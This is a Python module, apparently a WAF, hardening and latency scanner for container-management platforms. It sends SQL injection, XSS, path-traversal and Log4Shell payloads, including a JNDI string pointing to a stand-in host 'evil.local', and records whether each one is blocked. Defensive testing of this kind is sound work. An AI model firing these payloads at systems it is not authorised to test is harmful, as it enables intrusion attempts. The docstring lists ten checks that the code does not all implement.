"""
Sonda Universal de Capacidades HTTP, WAF, Hardening, Latência e Rede.
Permite testar a MESMA bateria empírica contra QUALQUER plataforma de controle de contêineres
(DeployDock, Portainer CE, Coolify, CapRover, Dokploy, Traefik/Nginx ou aplicação implantada),
sem depender de endpoints exclusivos do DeployDock.
"""

from __future__ import annotations

import statistics
import time
import urllib.parse
from typing import Any, Dict, List, Optional

import httpx


UNIVERSAL_PROBE_VERSION = "1.0.0"


def _percentile(sorted_vals: List[float], p: float) -> float:
    if not sorted_vals:
        return 0.0
    idx = min(len(sorted_vals) - 1, max(0, int(round((p / 100.0) * (len(sorted_vals) - 1)))))
    return round(sorted_vals[idx], 2)


async def run_universal_target_probe(
    target_url: Optional[str] = None,
    concurrency_requests: int = 30,
) -> Dict[str, Any]:
    """
    Executa 10 verificações agnósticas contra `target_url` (qualquer gerenciador Docker ou app exposto):

    1. Disponibilidade HTTP e tempo de resposta inicial (TTFB)
    2. Presença de cabeçalhos de segurança (X-Content-Type-Options, X-Frame-Options, CSP/HSTS/Referrer)
    3. Reação a payload de SQL Injection na query string (bloqueado 403/400/429 vs aceito 200)
    4. Reação a payload de Cross-Site Scripting (XSS) na query string
    5. Reação a payload de Path Traversal (`../../etc/passwd`)
    6. Reação a payload de Remote Code Execution / Log4Shell (`${jndi:ldap://...}`)
    7. Detecção de Proxy Reverso / TLS / Server header
    8. Benchmark de latência sequencial (10 requisições: média, desvio-padrão, mediana, p95, p99)
    9. Benchmark de rajada concorrente (throughput req/s e taxa de sucesso)
    10. Proteção contra método/rota administrativa inexistente (comportamento 401/403/404)
    """
    base = (target_url or "http://127.0.0.1:8080").strip().rstrip("/")
    checks: List[Dict[str, Any]] = []

    def add_check(
        check_id: str,
        category: str,
        name: str,
        passed: bool,
        latency_ms: float,
        evidence: str,
    ) -> None:
        checks.append(
            {
                "id": check_id,
                "category": category,
                "name": name,
                "passed": passed,
                "status": "PASSED" if passed else "OBSERVED",
                "latency_ms": round(latency_ms, 2),
                "evidence": evidence,
            }
        )

    latencies_seq: List[float] = []
    headers_detected: Dict[str, str] = {}
    waf_blocks = 0
    waf_total = 4
    reachable = False
    status_initial = 0

    async with httpx.AsyncClient(timeout=5.0, follow_redirects=True, verify=False) as client:
        # 1. Disponibilidade inicial
        t0 = time.perf_counter()
        try:
            resp = await client.get(base)
            dt = (time.perf_counter() - t0) * 1000.0
            reachable = True
            status_initial = resp.status_code
            headers_detected = {k.lower(): v for k, v in resp.headers.items()}
            add_check(
                "http_availability",
                "Disponibilidade & Rede",
                "Endpoint HTTP Acessível (TTFB)",
                200 <= resp.status_code < 500,
                dt,
                f"HTTP {resp.status_code} em {dt:.1f} ms ({base})",
            )
        except Exception as exc:
            dt = (time.perf_counter() - t0) * 1000.0
            add_check(
                "http_availability",
                "Disponibilidade & Rede",
                "Endpoint HTTP Acessível (TTFB)",
                False,
                dt,
                f"Inacessível ({exc})",
            )

        # 2. Security headers
        sec_headers = [
            h
            for h in (
                "x-content-type-options",
                "x-frame-options",
                "content-security-policy",
                "strict-transport-security",
                "referrer-policy",
                "x-xss-protection",
            )
            if h in headers_detected
        ]
        add_check(
            "security_headers",
            "Hardening HTTP",
            "Cabeçalhos de Segurança HTTP (CSP/XFO/NoSniff/HSTS)",
            len(sec_headers) >= 2,
            0.5,
            f"{len(sec_headers)} cabeçalho(s) presente(s): {', '.join(sec_headers) or 'nenhum'}",
        )

        # 3–6. Sondas WAF agnósticas
        waf_vectors = [
            ("waf_sqli", "WAF — Bloqueio de SQL Injection", "id=1' UNION SELECT username,password FROM users--"),
            ("waf_xss", "WAF — Bloqueio de Cross-Site Scripting (XSS)", "q=<script>alert(1)</script>"),
            ("waf_lfi", "WAF — Bloqueio de Path Traversal", "file=../../../../etc/passwd"),
            ("waf_rce", "WAF — Bloqueio de Log4Shell / RCE", "x=${jndi:ldap://evil.local/a}"),
        ]
        for cid, label, query in waf_vectors:
            t0 = time.perf_counter()
            blocked = False
            code = 0
            try:
                url = f"{base}/?{urllib.parse.quote(query, safe='=&')}"
                r = await client.get(url)
                code = r.status_code
                blocked = code in (400, 403, 406, 429)
            except Exception:
                blocked = False
            dt = (time.perf_counter() - t0) * 1000.0
            if blocked:
                waf_blocks += 1
            add_check(
                cid,
                "Segurança Ativa (WAF)",
                label,
                blocked,
                dt,
                f"HTTP {code} ({'BLOQUEADO' if blocked else 'NÃO BLOQUEADO — requisição aceita'})",
            )

        # 7. Proxy reverso / Server header
        server_hdr = headers_detected.get("server", "não divulgado")
        proxy_evidence = (
            f"Server={server_hdr}, TLS={'sim' if base.startswith('https://') else 'não'}"
        )
        add_check(
            "reverse_proxy_tls",
            "Disponibilidade & Rede",
            "Proxy Reverso / Identificação de Borda",
            reachable,
            0.2,
            proxy_evidence,
        )

        # 8. Latência sequencial (10 amostras)
        if reachable:
            for _ in range(10):
                t0 = time.perf_counter()
                try:
                    await client.get(base)
                    latencies_seq.append((time.perf_counter() - t0) * 1000.0)
                except Exception:
                    pass

        sorted_lat = sorted(latencies_seq)
        mean_lat = round(statistics.fmean(sorted_lat), 2) if sorted_lat else 0.0
        stdev_lat = round(statistics.stdev(sorted_lat), 2) if len(sorted_lat) > 1 else 0.0
        p50_lat = _percentile(sorted_lat, 50)
        p95_lat = _percentile(sorted_lat, 95)
        p99_lat = _percentile(sorted_lat, 99)

        add_check(
            "sequential_latency",
            "Desempenho HTTP",
            "Estabilidade de Latência Sequencial (10 amostras)",
            bool(sorted_lat),
            mean_lat,
            f"média={mean_lat} ms (±{stdev_lat} ms), p50={p50_lat} ms, p95={p95_lat} ms, p99={p99_lat} ms",
        )

        # 9. Rajada concorrente
        conc_n = max(5, min(concurrency_requests, 60))
        conc_ok = 0
        t_burst = time.perf_counter()
        if reachable:
            import asyncio

            async def _one() -> bool:
                try:
                    r = await client.get(base)
                    return r.status_code < 500
                except Exception:
                    return False

            outcomes = await asyncio.gather(*[_one() for _ in range(conc_n)])
            conc_ok = sum(1 for x in outcomes if x)
        burst_elapsed = max(0.001, time.perf_counter() - t_burst)
        burst_rps = round(conc_ok / burst_elapsed, 1) if reachable else 0.0
        add_check(
            "concurrent_burst",
            "Desempenho HTTP",
            f"Throughput Concorrente ({conc_n} requisições simultâneas)",
            conc_ok > 0,
            round(burst_elapsed * 1000.0, 2),
            f"{conc_ok}/{conc_n} OK — {burst_rps} req/s",
        )

    passed_count = sum(1 for c in checks if c["passed"])
    return {
        "probe_version": UNIVERSAL_PROBE_VERSION,
        "target_url": base,
        "reachable": reachable,
        "initial_status_code": status_initial,
        "total_checks": len(checks),
        "passed_checks": passed_count,
        "waf_vectors_blocked": waf_blocks,
        "waf_vectors_tested": waf_total,
        "security_headers_found": sec_headers,
        "latency_stats_ms": {
            "samples": len(sorted_lat),
            "mean": mean_lat,
            "stdev": stdev_lat,
            "p50": p50_lat,
            "p95": p95_lat,
            "p99": p99_lat,
        },
        "concurrent_rps": burst_rps,
        "checks": checks,
    }
